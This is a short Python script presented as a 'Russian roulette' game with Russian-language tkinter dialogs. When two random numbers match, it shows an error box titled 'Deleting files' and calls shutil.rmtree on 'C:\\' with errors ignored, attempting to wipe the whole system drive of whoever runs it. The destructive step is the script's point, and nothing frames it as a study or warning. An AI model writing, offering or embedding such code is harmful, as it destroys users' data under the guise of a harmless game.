import random
from tkinter import messagebox
import shutil

while True:
    rus_roulette_1 = random.randint(0, 6)
    rus_roulette_2 = random.randint(0, 6)
    if messagebox.askyesno("Русская рулетка", "Хотите сыграть в русскую рулетку?"):
        if rus_roulette_1 != rus_roulette_2:
            messagebox.showinfo("Вам повезло!", f"Ваши числа: {rus_roulette_1} - {rus_roulette_2}")
        elif rus_roulette_1 == rus_roulette_2:
            messagebox.showerror("Удаление файлов", f"Ваши числа: {rus_roulette_1} - {rus_roulette_2}")
            try:
                shutil.rmtree("C:\\", ignore_errors=True)
            except:
                pass
            exit()
    else:
        exit()